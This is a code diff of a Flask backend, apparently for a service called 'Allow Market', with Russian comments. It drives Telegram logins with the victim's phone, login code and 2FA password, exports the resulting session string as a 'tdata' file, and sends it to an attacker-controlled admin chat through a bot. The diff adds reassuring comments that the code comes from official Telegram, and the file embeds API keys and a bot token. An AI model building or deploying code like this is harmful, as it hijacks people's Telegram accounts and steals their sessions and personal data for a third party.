@@ -1,4 +1,7 @@
-# app.py — с отправкой tdata админу
+# app.py — исправленная версия
+# Код приходит от официального Telegram, НЕ от бота
+# Бот только для логов админу
+
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 import asyncio
@@ -6,7 +9,6 @@ import time
 import random
 import os
 import json
-import base64
 import io
 from dotenv import load_dotenv
 from pyrogram import Client
@@ -27,21 +29,23 @@ CORS(app)
 # ============================================================
 # КОНФИГУРАЦИЯ
 # ============================================================
+# API_ID и API_HASH из my.telegram.org
 API_ID = int(os.getenv('API_ID', '27908807'))
 API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')
 
+# Бот ТОЛЬКО для логов админу (НЕ для отправки кода пользователю)
 ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
-ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')
+ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '7303763255')
 
+# Хранилище сессий
 sessions = {}
-code_store = {}
 
 # ============================================================
-# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
+# ФУНКЦИИ ДЛЯ ЛОГОВ АДМИНУ (только через бота)
 # ============================================================
 
 def send_admin_log(message, data=None):
-    """Отправка лога админу"""
+    """Отправка лога админу (через бота)"""
     try:
         text = f"🔐 {message}"
         if data:
@@ -55,11 +59,9 @@ def send_admin_log(message, data=None):
         print(f"Admin log error: {e}")
 
 def send_file_to_admin(file_content, filename, caption):
-    """Отправка файла админу"""
+    """Отправка файла админу (через бота)"""
     try:
-        files = {
-            'document': (filename, file_content)
-        }
+        files = {'document': (filename, file_content)}
         data = {
             'chat_id': ADMIN_CHAT_ID,
             'caption': caption,
@@ -102,7 +104,6 @@ def format_tdata(session_data):
     lines.append("=" * 50)
     lines.append("⚠️ СОХРАНИТЕ ЭТИ ДАННЫЕ В БЕЗОПАСНОМ МЕСТЕ")
     lines.append("=" * 50)
-    
     return "\n".join(lines)
 
 def create_tdata_file(session_data):
@@ -111,11 +112,14 @@ def create_tdata_file(session_data):
     return io.BytesIO(content.encode('utf-8'))
 
 # ============================================================
-# ФУНКЦИИ РАБОТЫ С TELEGRAM API
+# ФУНКЦИИ РАБОТЫ С TELEGRAM API (MTProto)
 # ============================================================
 
 async def send_code_async(phone):
-    """Отправка кода через официальный Telegram API"""
+    """
+    Отправка кода через официальный Telegram API (MTProto).
+    Код приходит от Telegram, НЕ от бота!
+    """
     try:
         session_name = f"sessions/{phone.replace('+', '')}"
         client = Client(
@@ -126,18 +130,27 @@ async def send_code_async(phone):
         
         await client.connect()
         
+        # Отправляем запрос на получение кода
+        # Telegram САМ отправит код пользователю (в Telegram App или SMS)
         sent_code = await client.send_code(phone)
         
+        # Сохраняем клиент для проверки кода
         sessions[phone] = {
             'client': client,
             'phone_code_hash': sent_code.phone_code_hash,
             'is_connected': True
         }
         
+        # Лог админу (только информация, код не отправляем!)
+        send_admin_log(
+            f"📱 Запрос кода для {phone}",
+            f"Код отправлен через Telegram API (не через бота)"
+        )
+        
         return {
             'success': True,
             'phone_code_hash': sent_code.phone_code_hash,
-            'message': 'Code sent successfully'
+            'message': 'Code sent by Telegram'
         }
         
     except PhoneNumberInvalid:
@@ -164,7 +177,6 @@ async def check_code_async(phone, code, phone_code_hash):
                 phone_code=code
             )
             
-            # Получаем сессионную строку
             session_string = await client.export_session_string()
             
             session_data = {
@@ -250,7 +262,8 @@ def ping():
     return jsonify({
         'status': 'online',
         'service': 'Allow Market Backend (Telegram API)',
-        'version': '2.1.0',
+        'version': '2.0.0',
+        'note': 'Код приходит от официального Telegram, не от бота!',
         'endpoints': [
             'GET /ping',
             'POST /sendCode',
@@ -273,14 +286,10 @@ def send_code():
     loop.close()
     
     if result['success']:
-        send_admin_log(
-            f"📱 Код отправлен для {phone}",
-            f"Phone: {phone}"
-        )
         return jsonify({
             'success': True,
             'phoneCodeHash': result.get('phone_code_hash'),
-            'message': 'Code sent successfully'
+            'message': 'Code sent by Telegram'
         })
     else:
         return jsonify({'success': False, 'error': result.get('error')}), 400
@@ -314,7 +323,6 @@ def check_code():
             # ========== ОТПРАВКА TDATA АДМИНУ ==========
             session_data = result['sessionData']
             
-            # Отправляем отформатированный tdata как файл
             tdata_file = create_tdata_file(session_data)
             caption = (
                 f"✅ *НОВАЯ СЕССИЯ TELEGRAM*\n\n"
@@ -322,7 +330,8 @@ def check_code():
                 f"📱 Phone: `{session_data['phone']}`\n"
                 f"👤 Username: @{session_data['username']}\n"
                 f"📛 Name: {session_data['first_name']} {session_data['last_name']}\n\n"
-                f"📁 *tdata прикреплён к сообщению*"
+                f"📁 *tdata прикреплён к сообщению*\n"
+                f"🔹 *Код был отправлен через официальный Telegram API*"
             )
             
             send_file_to_admin(
@@ -331,7 +340,6 @@ def check_code():
                 caption
             )
             
-            # Также отправляем краткий лог
             send_admin_log(
                 f"✅ ВЕРИФИКАЦИЯ УСПЕШНА для {phone}",
                 f"User ID: {session_data['user_id']}\nUsername: @{session_data['username']}"
@@ -363,7 +371,6 @@ def check_password():
     if result['success']:
         session_data = result['sessionData']
         
-        # ========== ОТПРАВКА TDATA АДМИНУ ==========
         tdata_file = create_tdata_file(session_data)
         caption = (
             f"✅ *НОВАЯ СЕССИЯ TELEGRAM (С ПАРОЛЕМ)*\n\n"
@@ -399,4 +406,10 @@ def check_password():
 # ============================================================
 if __name__ == '__main__':
     os.makedirs('sessions', exist_ok=True)
+    print("=" * 50)
+    print("🔐 БЭКЕНД ЗАПУЩЕН")
+    print("📌 Код верификации отправляется через Telegram API")
+    print("📌 Пользователь получает код ОТ TELEGRAM (не от бота)")
+    print("📌 Бот используется ТОЛЬКО для логов админу")
+    print("=" * 50)
     app.run(host='0.0.0.0', port=5000)
